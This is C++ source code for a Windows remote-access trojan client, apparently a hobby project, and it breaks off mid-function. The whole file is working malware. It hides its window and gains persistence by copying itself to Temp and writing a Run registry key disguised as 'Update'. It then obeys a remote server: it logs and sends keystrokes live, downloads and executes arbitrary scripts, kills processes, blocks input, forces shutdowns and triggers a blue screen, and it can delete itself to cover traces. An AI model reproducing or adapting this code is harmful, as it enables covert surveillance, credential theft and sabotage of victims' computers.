#include <iostream>
#include <winsock2.h>
#include <Ws2tcpip.h>
#include <thread>
#include <sstream>
#include <time.h>
#include <windows.h>
#include <fstream>
#include <winable.h>
#include <stdio.h>
#include <tchar.h>
#include <psapi.h>
#pragma comment(lib, "ntdll.lib") // BSOD

int v=0;
bool v2=true;
bool v3=true;
bool v4=true;
bool v5=true;
bool v6=true;
bool v7=true;
bool v8=true;
bool v9=true;
bool v10=true;
SOCKET Client;
addrinfo Server;
TCHAR name[30]={0};
char tit[100]={0};
char mes[500]={0};
char Csimb[3]={0};
char Cbott[3]={0};
char ctsk[7]={0};
char ver[50]="1.1.4";
int simb=0;
int bott=0;
int LagCount=0;
int data=0;

using namespace std;

int initSock();
SOCKET createSock();
addrinfo getSinfo(SOCKET,int);
addrinfo wcon(SOCKET,addrinfo);
void ricevi(SOCKET);
void manda(SOCKET);
void MSGBOX();
void reg_write(LPCTSTR,LPCTSTR,DWORD,const char*);
bool preliminari();
void CMOUSE();
void BMOUSE();
void VMOUSE();
void GETINFO(SOCKET);
bool CheckPreliminari();
void InitKeylog();
void DelClient();
void LiveKey(SOCKET);
void Lag();
bool SocketConnected(SOCKET);
void RandPixel();
void DataInst();
void Rbeep();
//functions to calculate and retrieve CPU Load information
static float CalculateCPULoad();
static unsigned long long FileTimeToInt64();
float GetCPULoad();
//functions to calculate and retrieve CPU Load information

//BSOD
EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG,BOOLEAN,BOOLEAN,PBOOLEAN);
EXTERN_C NTSTATUS NTAPI NtRaiseHardError(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PULONG_PTR Parameters, ULONG ValidResponseOption, PULONG Response);
//BSOD

///////////////////////////////////////////////////////////////MAIN

int main()
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	if(CheckPreliminari())
		if(preliminari())
			return 0;
	//InitKeylog();
	DataInst();
	int PORTA=5555;//RIF
	int check=0;
	if(initSock()!=-1)
	{
		Client=createSock();
		if(Client!=0)
		{
			Server=getSinfo(Client,PORTA);
			if(Server.ai_family==-1)
				return 0;
		}
		else if(Client==0)
			return 0;
	}
	else if(initSock()==-1)
		return 0;
	
	Server=wcon(Client,Server);
	
	thread t1(ricevi,Client);
	t1.detach();
	thread t2(manda,Client);
	t2.detach();
	
	while(v!=-1)
	{
		Sleep(1000);
	}
	
	WSACleanup();
	Sleep(1000);
	return 0;
}

///////////////////////////////////////////////////////////////FUNZIONI

int initSock()
{
	WSADATA WSAData;
	if(WSAStartup (MAKEWORD(2,2), &WSAData))
	{
		cout<<"Errore nell'inizializzazione delle socket..."<<endl;
		WSACleanup();
		return -1;
	}
	return 0;
}

SOCKET createSock()
{
	SOCKET s=socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if(s == INVALID_SOCKET)
	{
		cout<<"Errore nella creazione del socket... "<<WSAGetLastError()<<endl;
		closesocket(s);
		WSACleanup();
		return 0;
	}
	return s;
}

addrinfo getSinfo(SOCKET s,int p)
{
	addrinfo *ainfo;
	if (getaddrinfo("127.0.0.1", NULL, NULL, &ainfo))
	{
		cout<<"Errore: impossibile risolvere l'indirizzo..."<<endl;
		closesocket(s);
		WSACleanup();
		ainfo->ai_family=-1;
		return *ainfo;
	}
	((sockaddr_in *)(ainfo->ai_addr))->sin_port = htons (p);
	return *ainfo;
}

addrinfo wcon(SOCKET s,addrinfo a)
{
	v5=false;
	char sig[30]="cripe";
	DWORD cchCN=30;
	cout<<"<Client> Tento di connettermi al Server..."<<endl;
	while(true)
	{
		Sleep(1000);
		if(connect(s,(sockaddr *)(a.ai_addr),sizeof(sockaddr_in)))
		{
			freeaddrinfo(a.ai_next);
			cout<<"<Client> Errore: impossibile connettersi, riprovo..."<<endl;
		}
		else
		{
			cout<<"<Client> Connesso con il Server!\n"<<endl;
			Sleep(10);
			send(s,sig,30,0);
			GetUserName(name,&cchCN);
			send(s,name,30,0);
			v5=true;
			break;
		}
	}
	freeaddrinfo(a.ai_next);
	return a;
}

void ricevi(SOCKET s)
{
	int ck=0;
	char msg[2]={0};
	while(true)
	{	
		ck=recv(s,msg,sizeof(msg),0);
		if(msg!=0 && ck!=-1)
		{
			if(msg[0]=='A' && msg[1]=='A')
			{
				cout<<"\n<Client> Il Server ha chiuso la connessione...";
				closesocket(s);
				v5=false;
				v=-1;
				return;
			}
			if(v==-1)
				return;
			if(msg[0]=='B' && msg[1]=='B')
			{
				system("shutdown -s -t 1 -f");
				cout<<"<Server> Shutdown."<<endl;
			}
			if(msg[0]=='D' && msg[1]=='D')
			{
				system("shutdown -r -t 1 -f");
				cout<<"<Server> Reboot."<<endl;
			}
			if(msg[0]=='C' && msg[1]=='C')
			{
				SwapMouseButton(true);
				cout<<"<Server> Mouse swap."<<endl;
			}
			if(msg[0]=='C' && msg[1]=='R')
			{
				SwapMouseButton(false);
				cout<<"<Server> Mouse unswap."<<endl;
			}
			if(msg[0]=='E' && msg[1]=='E')
			{
				mciSendString("set cdaudio door open",NULL,0,NULL);
				cout<<"<Server> Open CD."<<endl;
			}
			if(msg[0]=='E' && msg[1]=='R')
			{
				mciSendString("set cdaudio door closed",NULL,0,NULL);
				cout<<"<Server> Close CD."<<endl;
			}
			if(msg[0]=='F' && msg[1]=='F')
			{
				SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM)2);
				cout<<"<Server> Monitor off."<<endl;
			}
			if(msg[0]=='G' && msg[1]=='G')
			{
				recv(s,tit,sizeof(tit),0);
				recv(s,mes,sizeof(mes),0);
				recv(s,Csimb,sizeof(Csimb),0);
				recv(s,Cbott,sizeof(Cbott),0);
				simb=atoi(Csimb);
				bott=atoi(Cbott);
				thread t3(MSGBOX);
				t3.detach();
				cout<<"<Server> Msgbox."<<endl;
			}
			if(msg[0]=='H' && msg[1]=='H')
			{
				cout<<"<Server> Client restart."<<endl;
				
				char bufferEXE[MAX_PATH];
				char cmd[MAX_PATH]="start \"\" \"";
				GetModuleFileName( NULL, bufferEXE, MAX_PATH );
				for(int i=10;i<MAX_PATH;i++)
				{
					cmd[i]=bufferEXE[i-10];
					if(cmd[i]=='e' && cmd[i-1]=='x' && cmd[i-2]=='e' && cmd[i-3]=='.')
					{
						cmd[i+1]=='\"';
						i++;
					}
				}
				system(cmd);
				
				v2=false;
				v3=false;
				v4=false;
				v5=false;
				v6=false;
				v7=true;
				v8=false;
				closesocket(s);
				v=-1;
				return;
			}
			if(msg[0]=='I' && msg[1]=='I')
			{
				thread t4(CMOUSE);
				t4.detach();
				cout<<"<Server> CrazyMouse."<<endl;
			}
			if(msg[0]=='I' && msg[1]=='R')
			{
				v2=false;
				cout<<"<Server> CrazyMouse stop."<<endl;
			}
			if(msg[0]=='J' && msg[1]=='J')
			{
				thread t4(BMOUSE);
				t4.detach();
				cout<<"<Server> BlockMouse."<<endl;
			}
			if(msg[0]=='J' && msg[1]=='R')
			{
				v3=false;
				cout<<"<Server> UnlockMouse."<<endl;
			}
			if(msg[0]=='K' && msg[1]=='K')
			{
				thread t5(VMOUSE);
				t5.detach();
				cout<<"<Server> MouseViber."<<endl;
			}
			if(msg[0]=='K' && msg[1]=='R')
			{
				v4=false;
				cout<<"<Server> MouseUnviber."<<endl;
			}
			if(msg[0]=='L' && msg[1]=='L')
			{
				cout<<"<Server> GetInfo."<<endl;
				GETINFO(s);
			}
			if(msg[0]=='M' && msg[1]=='M')
			{
				ShowWindow(GetConsoleWindow(), SW_SHOWNORMAL);
				cout<<"<Server> Client show."<<endl;
			}
			if(msg[0]=='M' && msg[1]=='R')
			{
				ShowWindow(GetConsoleWindow(), SW_HIDE);
				cout<<"<Server> Client hide."<<endl;
			}
			if(msg[0]=='N' && msg[1]=='N')
			{
				char web[100]={0};
				recv(s,web,sizeof(web),0);
				if(web[0]!='h' || web[1]!='t' || web[2]!='t' || web[3]!='p')
				{
					char final[100]="http://";
					for(int i=0;i<100-7;i++)
					{
						final[i+7]=web[i];
						web[i]=final[i];
					}
				}
				cout<<"<Server> Open web page "<<web<<endl;
				ShellExecute(NULL,"open",web,NULL,NULL,SW_SHOWNORMAL);
			}
			if(msg[0]=='O' && msg[1]=='O')
			{
				cout<<"<Server> Client delete."<<endl;
				DelClient();
				closesocket(s);
				v2=false;
				v3=false;
				v4=false;
				v5=false;
				v6=false;
				v7=true;
				v8=false;
				v=-1;
				return;
			}
			if(msg[0]=='P' && msg[1]=='P')
			{
				v6=true;
				cout<<"<Server> LiveKeylogger START."<<endl;
				thread tv(LiveKey,s);
				tv.detach();
				Sleep(500);
				while(v6)
				{
					for(char i=1;i<=127;i++)
					{
						if(GetAsyncKeyState(i)==-32767)
						{
							send(s,&i,sizeof(i),0);
						}
						if(v6==false)
								break;
					}
				}
				cout<<"<Server> LiveKeylogger END."<<endl;
			}
			if(msg[0]=='Q' && msg[1]=='Q')
			{
				v7=false;
				cout<<"<Server> Lag START."<<endl;
				thread tlag(Lag);
				tlag.detach();
			}
			if(msg[0]=='Q' && msg[1]=='R')
			{
				v7=true;
				cout<<"<Server> Lag STOP."<<endl;
			}
			if(msg[0]=='R' && msg[1]=='R')
			{
				char trash='~';
				send(s,&trash,sizeof(trash),0);
				cout<<"<Server> TASKBAR."<<endl;
				send(s,&ctsk[0],sizeof(ctsk[0]),0);
				send(s,&ctsk[1],sizeof(ctsk[1]),0);
				send(s,&ctsk[2],sizeof(ctsk[2]),0);
				send(s,&ctsk[3],sizeof(ctsk[3]),0);
				send(s,&ctsk[4],sizeof(ctsk[4]),0);
				send(s,&ctsk[5],sizeof(ctsk[5]),0);
				send(s,&ctsk[6],sizeof(ctsk[6]),0);
			}
			if(msg[0]=='R' && msg[1]=='1')
			{
				HWND hwnd=FindWindow((LPCSTR)"Shell_TrayWnd", NULL);
				if(ctsk[0]%2==0)
				{
					ShowWindow(hwnd,SW_HIDE);
					cout<<"<Server> TaskBar Hide."<<endl;
				}
				else
				{
					cout<<"<Server> TaskBar Show."<<endl;
					ShowWindow(hwnd,SW_SHOW);
				}
				UpdateWindow(hwnd);
				ctsk[0]++;
			}
			if(msg[0]=='R' && msg[1]=='2')
			{
				HWND hwnd=FindWindow("Shell_TrayWnd", NULL);
			    hwnd=FindWindowEx(hwnd,HWND(0),"TrayNotifyWnd",NULL);
				hwnd=FindWindowEx(hwnd,HWND(0),"TrayClockWClass",NULL);
				if(ctsk[1]%2==0)
				{
					ShowWindow(hwnd,SW_HIDE);
					cout<<"<Server> Clock Hide."<<endl;
				}
				else
				{
					cout<<"<Server> Clock Show."<<endl;
					ShowWindow(hwnd,SW_SHOW);
				}
				UpdateWindow(hwnd);
				ctsk[1]++;
			}
			if(msg[0]=='R' && msg[1]=='3')
			{
				HWND hwnd=FindWindow("Shell_TrayWnd", NULL);
			    hwnd=FindWindowEx(hwnd,HWND(0),"Start",NULL);
				if(ctsk[2]%2==0)
				{
					ShowWindow(hwnd,SW_HIDE);
					cout<<"<Server> StartButton Hide."<<endl;
				}
				else
				{
					cout<<"<Server> StartButton Show."<<endl;
					ShowWindow(hwnd,SW_SHOW);
				}
				UpdateWindow(hwnd);
				ctsk[2]++;
			}
			if(msg[0]=='R' && msg[1]=='4')
			{
				HWND hwnd=FindWindow("Shell_TrayWnd", NULL);
			    hwnd=FindWindowEx(hwnd,HWND(0),"TrayNotifyWnd",NULL);
				if(ctsk[3]%2==0)
				{
					ShowWindow(hwnd,SW_HIDE);
					cout<<"<Server> NotifyIcon Hide."<<endl;
				}
				else
				{
					cout<<"<Server> NotifyIcon Show."<<endl;
					ShowWindow(hwnd,SW_SHOW);
				}
				UpdateWindow(hwnd);
				ctsk[3]++;
			}
			if(msg[0]=='R' && msg[1]=='5')
			{
				HWND hwnd=FindWindow("Shell_TrayWnd", NULL);
				hwnd=FindWindowEx(hwnd,HWND(0),"TrayNotifyWnd",NULL);
			    hwnd=FindWindowEx(hwnd,HWND(0),"TrayButton",NULL);
				if(ctsk[4]%2==0)
				{
					ShowWindow(hwnd,SW_HIDE);
					cout<<"<Server> Notify Hide."<<endl;
				}
				else
				{
					cout<<"<Server> Notify Show."<<endl;
					ShowWindow(hwnd,SW_SHOW);
				}
				UpdateWindow(hwnd);
				ctsk[4]++;
			}
			if(msg[0]=='R' && msg[1]=='6')
			{
				HWND hwnd=FindWindow("Shell_TrayWnd", NULL);
			    hwnd=FindWindowEx(hwnd,HWND(0),"TrayNotifyWnd",NULL);
			    hwnd=FindWindowEx(hwnd,HWND(0),"Button",NULL);
				if(ctsk[5]%2==0)
				{
					ShowWindow(hwnd,SW_HIDE);
					cout<<"<Server> TaskBar Hide."<<endl;
				}
				else
				{
					cout<<"<Server> TaskBar Show."<<endl;
					ShowWindow(hwnd,SW_SHOW);
				}
				UpdateWindow(hwnd);
				ctsk[5]++;
			}
			if(msg[0]=='R' && msg[1]=='7')
			{
				HWND hwnd=FindWindow("Program Manager", NULL);
    			hwnd=FindWindowEx(hwnd,HWND(0),"Progman",NULL);
				if(ctsk[6]%2==0)
				{
					ShowWindow(hwnd,SW_HIDE);
					cout<<"<Server> Desktop Hide."<<endl;
				}
				else
				{
					cout<<"<Server> Desktop Show."<<endl;
					ShowWindow(hwnd,SW_SHOW);
				}
				UpdateWindow(hwnd);
				ctsk[6]++;
			}
			if(msg[0]=='S' && msg[1]=='S')
			{
				BlockInput(true);
				cout<<"<Server> Mouse&Keyboard block."<<endl;
			}
			if(msg[0]=='S' && msg[1]=='R')
			{
				BlockInput(false);
				cout<<"<Server> Mouse&Keyboard unlock."<<endl;
			}
			if(msg[0]=='T' && msg[1]=='T')
			{
				int n=0;
				char PID[50]={0};
				char tpcFINE[MAX_PATH]=TEXT("FINE");
				cout<<"<Server> TPC."<<endl;
				DWORD aProcesses[1024], cbNeeded, cProcesses;
				EnumProcesses(aProcesses,sizeof(aProcesses),&cbNeeded);
				cProcesses=cbNeeded/sizeof(DWORD);
			    for(int i=0;i<cProcesses;i++)
			    {
			        if(aProcesses[i]!=0)
			        {
			            char szProcessName[MAX_PATH]=TEXT("<unknown>");
			            HANDLE hProcess=OpenProcess(PROCESS_QUERY_INFORMATION|PROCESS_VM_READ,FALSE,aProcesses[i]);
			            if(NULL!=hProcess)
					    {
					    	GetModuleFileNameEx(hProcess, 0, szProcessName, MAX_PATH);
					    	if(szProcessName[0]!='<' && szProcessName[0]!='?')
						    {
						    	for(int cnt=MAX_PATH;cnt>0;cnt--)
						    	{
						    		if(szProcessName[cnt]=='\\')
						    		{
						    			for(int ii=1;ii<100;ii++)
						    			{
						    				szProcessName[ii-1]=szProcessName[cnt+ii];
										}
										cnt=0;
									}
								}
						    	int tmp=aProcesses[i];
					        	char Pid[MAX_PATH]={0};
					        	sprintf(Pid,"%d",tmp);
					        	send(s,szProcessName,sizeof(szProcessName),0);
					        	send(s,Pid,sizeof(Pid),0);
							}
					        CloseHandle(hProcess);
					    }
			        }
			    }
			    send(s,tpcFINE,sizeof(tpcFINE),0);
			    recv(s,PID,sizeof(PID),0);
			    switch(PID[0])
			    {
			    	case '0':
			    		cout<<"<Server> TPC cancelled."<<endl;
			    	break;
			    	
			    	default:
			    		char FIN[100]="taskkill /F /PID ";
			    		for(int i=17;i<50;i++)
			    			FIN[i]=PID[i-17];
			    		system(FIN);
			    	break;
				}
			}
			if(msg[0]=='U' && msg[1]=='U')
			{
				cout<<"<Server> RandPix ON."<<endl;
				v8=true;
				for(int i=0;i<3;i++)
				{
					thread rp(RandPixel);
					rp.detach();
					Sleep(100);
				}
			}
			if(msg[0]=='U' && msg[1]=='R')
			{
				cout<<"<Server> RandPix OFF."<<endl;
				v8=false;
			}
			if(msg[0]=='V' && msg[1]=='V')
			{
				cout<<"<Server> MouseTrack ON."<<endl;
				char Cx[5]={0};
				char Cy[5]={0};
				char Px[5]={0};
				char Py[5]={0};
				char Cmsx[5]={0};
				char Cmdx[5]={0};
				int Lmax_x=GetSystemMetrics(SM_CXSCREEN)+1;
				int Lmax_y=GetSystemMetrics(SM_CYSCREEN)+1;
				int Rmax_x;
				int Rmax_y;
				POINT pos;
				recv(s,Cx,sizeof(Cx),0);
				recv(s,Cy,sizeof(Cy),0);
				Rmax_x=atoi(Cx)+1;
				Rmax_y=atoi(Cy)+1;
				for(v9=true;v9;)
				{
					recv(s,Px,sizeof(Px),0);
					if(Px[0]=='s' && Px[1]=='t' && Px[2]=='o' && Px[3]=='p')
						v9=false;
					if(v9)
						recv(s,Py,sizeof(Py),0);
					if(Py[0]=='s' && Py[1]=='t' && Py[2]=='o' && Py[3]=='p')
						v9=false;
					if(v9)
						recv(s,Cmsx,sizeof(Cmsx),0);
					if(Cmsx[0]=='s' && Cmsx[1]=='t' && Cmsx[2]=='o' && Cmsx[3]=='p')
						v9=false;
					if(v9)
						recv(s,Cmdx,sizeof(Cmdx),0);
					if(Cmdx[0]=='s' && Cmdx[1]=='t' && Cmdx[2]=='o' && Cmdx[3]=='p')
						v9=false;
					if(v9)
					{
						pos.x=atoi(Px)+1;
						pos.y=atoi(Py)+1;
						SetCursorPos((int)((float)pos.x/(float)Rmax_x*Lmax_x),(int)((float)pos.y/(float)Rmax_y*Lmax_y));
						if(Cmsx[0]==1)
						{
							mouse_event(MOUSEEVENTF_LEFTDOWN,0,0,0,0);
							mouse_event(MOUSEEVENTF_LEFTUP,0,0,0,0);
						}
						if(Cmdx[0]==1)
						{
							mouse_event(MOUSEEVENTF_RIGHTDOWN,0,0,0,0);
							mouse_event(MOUSEEVENTF_RIGHTUP,0,0,0,0);
						}
					}
				}
				cout<<"<Server> MouseTrack OFF."<<endl;
			}
			if(msg[0]=='W' && msg[1]=='W')
			{
				cout<<"<Server> Script."<<endl;
				char Csize[20]={0};
				recv(s,Csize,sizeof(Csize),0);
				int size=atoi(Csize);
				char Cscript[size]={0};
				recv(s,Cscript,sizeof(Cscript),0);
				char estensione[3]={0};
				recv(s,estensione,sizeof(estensione),0);
				
				//ifstream infile;
				ofstream outfile;
				
				char nomeFile[30]="S1C2R3I4P5T.";
				switch(estensione[0])
				{
					case '0':
						nomeFile[12]='t';
						nomeFile[13]='x';
						nomeFile[14]='t';
					break;
					case '1':
						nomeFile[12]='v';
						nomeFile[13]='b';
						nomeFile[14]='s';
					break;
					case '2':
						nomeFile[12]='b';
						nomeFile[13]='a';
						nomeFile[14]='t';
					break;
					case '3':
						nomeFile[12]='c';
						nomeFile[13]='m';
						nomeFile[14]='d';
					break;
				}
				
				char buff[MAX_PATH];
				char cmd[MAX_PATH]="start \"\" \"";
				GetModuleFileName(NULL,buff,MAX_PATH);
				
				for(int i=0;i<MAX_PATH;i++)
				{
					if(buff[i]=='\\' && buff[i-1]=='p' && buff[i-2]=='m' && buff[i-3]=='e' && buff[i-4]=='T')
					{
						for(int ii=1;ii<30;ii++)
						{
							buff[i+ii]=nomeFile[ii-1];
						}
					}
				}
				for(int i=10;i<MAX_PATH;i++)
				{
					cmd[i]=buff[i-10];
					if(cmd[i-4]=='.')
					{
						cmd[i]='\"';
					}
				}
				
				outfile.open(buff);
				outfile<<Cscript;
				outfile.close();
				
				system(cmd);
			}
			if(msg[0]=='X' && msg[1]=='X')
			{
				cout<<"<Server> Background deleted."<<endl;
				string tmp = "C:\\picture.jpg";
   			 	SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, (PVOID*)tmp.c_str(), SPIF_SENDCHANGE);
			}
			if(msg[0]=='Y' && msg[1]=='Y')
			{
				cout<<"<Server> BSOD trigger."<<endl;
				BOOLEAN bl;
				unsigned long response;
				RtlAdjustPrivilege(19, true, false, &bl);
				NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &response);
			}
			if(msg[0]=='Z' && msg[1]=='Z')
			{
				cout<<"<Server> Beep on."<<endl;
				v10=true;
				thread rb(Rbeep);
				rb.detach();
			}
			if(msg[0]=='Z' && msg[1]=='R')
			{
				cout<<"<Server> Beep off."<<endl;
				v10=false;
			}
		}
		else
			Sleep(5000);
	}
	return;
}

void manda(SOCKET s)
{	
	char c=0;
	while(true)
	{	
		if(v==-1)
		{
			return;
		}
		Sleep(5000);
		if(v5)
		if(recv(s,&c,1,MSG_PEEK)==-1)
		{
			v2=false;
			v3=false;
			v4=false;
			v6=false;
			v7=true;
			v8=false;
			closesocket(Client);
			Client=createSock();
			Sleep(1000);
			if(v!=-1)
				Server=wcon(Client,Server);
		}
	}
}

void RandPixel()
{
	srand(GetTickCount());
	HDC dcDesktop = GetWindowDC(NULL);
	while(v8)
		SetPixel(dcDesktop,rand()%GetSystemMetrics(SM_CXSCREEN),rand()%GetSystemMetrics(SM_CYSCREEN),GetPixel(dcDesktop,rand()%GetSystemMetrics(SM_CXSCREEN),rand()%GetSystemMetrics(SM_CYSCREEN)));
	return;
}

void Lag()
{
	int iLag=0;
	if(LagCount<11)
	{
		LagCount++;
		thread ttlag(Lag);
		ttlag.detach();
	}
	while(true)
	{
		iLag++;
		if(v7)
			return;
	}	
	return;
}

void LiveKey(SOCKET s)
{
	char LVK=0;
	while(v6)
	{
		recv(s,&LVK,sizeof(LVK),0);
		if(LVK=='~')
		{
			v6=false;
			Sleep(1000);
			send(s,&LVK,sizeof(LVK),0);
		}
		
	}
	return;
}

void MSGBOX()
{
	MessageBox(NULL, mes, tit, simb | bott);
	return;
}

void reg_write(LPCTSTR subkey,LPCTSTR name,DWORD type,const char* value)
{
	HKEY key;
	RegOpenKey(HKEY_CURRENT_USER,subkey,&key);
	RegSetValueEx(key,name,0,type,(LPBYTE)value,strlen(value)*sizeof(char));
	RegCloseKey(key);
	return;
}

bool preliminari()
{
	char buffer[MAX_PATH];
	GetModuleFileName( NULL, buffer, MAX_PATH );
	TCHAR szComputerName[256]={'\0'};
	DWORD cchComputerName = 256;
	char n[256]={'~'};
	char p1[256]="\"C:\\Users\\";
	char p2[256]="\\AppData\\Local\\Temp\\a.exe\"";//2RIF
	char pF[256]={'\0'};
	char pFC[256]={'\0'};
	char cmd[256]="start \"\" ";
	int c1=0;
	int c2=0;
	
	GetUserName(szComputerName, &cchComputerName);
	for(int i=0;i<256;i++)
	{
		if(szComputerName[i]!='\0')
			n[i]=szComputerName[i];
		if(szComputerName[i]=='\0' && szComputerName[i+1]!='\0')
			n[i]=szComputerName[i];
		if(szComputerName[i]=='\0' && szComputerName[i+1]=='\0')
		{
			n[i]='~';
			i=256;
		}
	}
	for(int i=0;i<100;i++)
	{
		pF[i]=p1[i];
		pFC[i]=p1[i+1];
		if(n[i]!='~')
			c1++;
		else
			n[i+1]='~';
	}
	for(int i=10;i<10+c1;i++)
	{
		pF[i]=n[i-10];
		pFC[i-1]=n[i-10];
	}
	for(int i=10+c1;i<255;i++)
		if(p2[c2]!='\0')
		{
			pF[i]=p2[c2];
			if(p2[c2]!='\"')
			pFC[i-1]=p2[c2];
			c2++;
		}
	for(int i=0;i<256;i++)
	{
		if(pF[i]=='~')
			pF[i]='\0';
		if(pFC[i]=='~')
			pFC[i]='\0';
	}
	
	CopyFile(buffer,pFC,true);
	reg_write("Software\\Microsoft\\Windows\\CurrentVersion\\Run","Update",REG_SZ,pF);
	
	for(int i=9;i<256;i++)
		cmd[i]=pF[i-9];
	
	system(cmd);
	
	return true;
}

void CMOUSE()
{
	srand(time(0));
	for(v2=true;v2;)
	{
		SetCursorPos(rand()%GetSystemMetrics(SM_CXSCREEN),rand()%GetSystemMetrics(SM_CYSCREEN));
		Sleep(10);
	}
	return;
}

void BMOUSE()
{
	POINT coor;
	GetCursorPos(&coor);
	for(v3=true;v3;)
	{
		SetCursorPos(coor.x,coor.y);
		Sleep(5);
	}
	return;
}

void VMOUSE()
{
	srand(time(0));
	POINT coor;
	for(v4=true;v4;)
	{
		GetCursorPos(&coor);
		switch(rand()%4)
		{
			case 0:
				SetCursorPos(coor.x+rand()%5,coor.y+rand()%5);
				Sleep(10);
			break;
			
			case 1:
				SetCursorPos(coor.x+rand()%5,coor.y-rand()%5);
				Sleep(10);
			break;
			
			case 2:
				SetCursorPos(coor.x-rand()%5,coor.y+rand()%5);
				Sleep(10);
			break;
			
			case 3:
				SetCursorPos(coor.x-rand()%5,coor.y-rand()%5);
				Sleep(10);
			break;
		}
	}
	return;
}

void GETINFO(SOCKET s)
{
	TCHAR szCN[256];
	DWORD cchCN=256;
	char buff[MAX_PATH];
	bool fRet=false;
    HANDLE hToken=NULL;
    char wnd_title[256];
    char uac='f';
    int CPU=(int)(GetCPULoad()*100);
	
	send(s,&uac,sizeof(uac),0);
	
	Sleep(50);
	
	GetComputerName(szCN,&cchCN);
	send(s,szCN,sizeof(szCN),0);
	
	GetUserName(szCN,&cchCN);
	send(s,szCN,sizeof(szCN),0);
	
	GetModuleFileName(NULL,buff,MAX_PATH);
	send(s,buff,sizeof(buff),0);
	
	send(s,ver,sizeof(ver),0);
	
	if(OpenProcessToken(GetCurrentProcess(),TOKEN_QUERY,&hToken))
	{
        TOKEN_ELEVATION Elevation;
        DWORD cbSize=sizeof(TOKEN_ELEVATION);
        if(GetTokenInformation(hToken,TokenElevation,&Elevation,sizeof(Elevation),&cbSize))
            fRet=Elevation.TokenIsElevated;
    }
    if(hToken)
        CloseHandle(hToken);
    if(fRet)
    	uac='t';
    else
    	uac='f';
    send(s,&uac,sizeof(uac),0);
    
    HWND hwnd=GetForegroundWindow();
    GetWindowText(hwnd,wnd_title,sizeof(wnd_title));
    send(s,wnd_title,sizeof(wnd_title),0);
    
    char Cdata[15]={0}; sprintf(Cdata,"%d",data);
    send(s,Cdata,sizeof(Cdata),0);
    
    char CCPU[20]={0}; sprintf(CCPU,"%d",CPU);
    send(s,CCPU,sizeof(CCPU),0);
	
	return;
}

bool CheckPreliminari()
{
	char buffer[MAX_PATH];
	GetModuleFileName( NULL, buffer, MAX_PATH );
	
	for(int i=0;i<MAX_PATH;i++)
	{
		if(buffer[i]=='T')
			if(buffer[i+1]=='e')
				if(buffer[i+2]=='m')
					if(buffer[i+3]=='p')
						return false;
	}
	
	return true;
}

void InitKeylog()
{
	int quanti=0;
	string logs[365];
	string logsN[365];
	
	ifstream infile;
	ofstream outfile;
	
	infile.open("prova.log");
	infile>>quanti;
	for(int i=0;i<quanti;i++)
		infile>>logsN[i];
	infile.close();
	
	if(quanti==0)
	{
		cout<<"eccomi"<<endl;
		outfile.open("prova.log");
		outfile<<"1 ";
		
		time_t     now = time(0);
	    struct tm  tstruct;
	    char       buf[80];
	    tstruct = *localtime(&now);
	    strftime(buf, sizeof(buf), "%Y-%m-%d.log", &tstruct);
	    
	    outfile<<buf;
    
		outfile.close();
	}
	
	return;
}

void DelClient()
{
	HKEY hreg;
	RegOpenKeyEx(HKEY_CURRENT_USER,(LPCSTR)"Software\\Microsoft\\Windows\\CurrentVersion\\Run",0,KEY_SET_VALUE,&hreg);
	RegDeleteValue(hreg,(LPCSTR)"Update");
	
	char bufferEXE[MAX_PATH];
	char bufferVBS[MAX_PATH];
	char bufferDAT[MAX_PATH];
	char cmd[MAX_PATH]="start \"\" ";
	GetModuleFileName( NULL, bufferEXE, MAX_PATH );
	GetModuleFileName( NULL, bufferVBS, MAX_PATH );
	GetModuleFileName( NULL, bufferDAT, MAX_PATH );
	
	for(int i=1;i<MAX_PATH;i++)
	{
		if(bufferVBS[i]=='T' && bufferVBS[i+1]=='e' && bufferVBS[i+2]=='m' && bufferVBS[i+3]=='p' && bufferVBS[i+4]=='\\')
		{
			bufferVBS[i+5]='A';
			bufferVBS[i+6]='u';
			bufferVBS[i+7]='t';
			bufferVBS[i+8]='D';
			bufferVBS[i+9]='.';
			bufferVBS[i+10]='v';
			bufferVBS[i+11]='b';
			bufferVBS[i+12]='s';
			i+=13;
			while(i<200)
			{
				bufferVBS[i]=0;
				i++;
			}
		}
	}
	
	for(int i=1;i<MAX_PATH;i++)
	{
		if(bufferDAT[i]=='T' && bufferDAT[i+1]=='e' && bufferDAT[i+2]=='m' && bufferDAT[i+3]=='p' && bufferDAT[i+4]=='\\')
		{
			bufferDAT[i+5]='z';
			bufferDAT[i+6]='z';
			bufferDAT[i+7]='D';
			bufferDAT[i+8]='A';
			bufferDAT[i+9]='T';
			bufferDAT[i+10]='A';
			bufferDAT[i+11]='z';
			bufferDAT[i+12]='z';
			i+=13;
			while(i<200)
			{
				bufferDAT[i]=0;
				i++;
			}
		}
	}
	
	ofstream outfile;
	
	outfile.open(bufferVBS);
	outfile<<"WScript.Sleep 10000\ndim filesys\nSet filesys = CreateObject(\"Scripting.FileSystemObject\")\nfilesys.DeleteFile \""<<bufferEXE<<"\"\nfilesys.DeleteFile \""<<bufferDAT<<"\"\nfilesys.DeleteFile \""<<bufferVBS<<"\"\n";
	outfile.close();
	
	for(int i=9;i<MAX_PATH;i++)
	{
		if(i==9)
		{
			cmd[i]='\"';
		}
		cmd[i+1]=bufferVBS[i-9];
		if(cmd[i+1]=='s' && cmd[i]=='b' && cmd[i-1]=='v' && cmd[i-2]=='.')
		{
			cmd[i+2]=='\"';
			i++;
		}
	}
	
	system(cmd);
	
	return;
}

void DataInst()
{
	ifstream infile;
	ofstream outfile;
	
	char nomeFile[30]="zzDATAzz";
	char buff[MAX_PATH];
	GetModuleFileName(NULL,buff,MAX_PATH);
	
	for(int i=0;i<MAX_PATH;i++)
	{
		if(buff[i]=='\\' && buff[i-1]=='p' && buff[i-2]=='m' && buff[i-3]=='e' && buff[i-4]=='T')
		{
			for(int ii=1;ii<30;ii++)
			{
				buff[i+ii]=nomeFile[ii-1];
			}
		}
	}
	
	infile.open(buff);
	infile>>data;
	infile.close();
	
	if(data==0)
	{
		data=time(0);
		
		outfile.open(buff);
		outfile<<data;
		outfile.close();
	}
	
	return;
}

static float CalculateCPULoad(unsigned long long idleTicks, unsigned long long totalTicks)
{
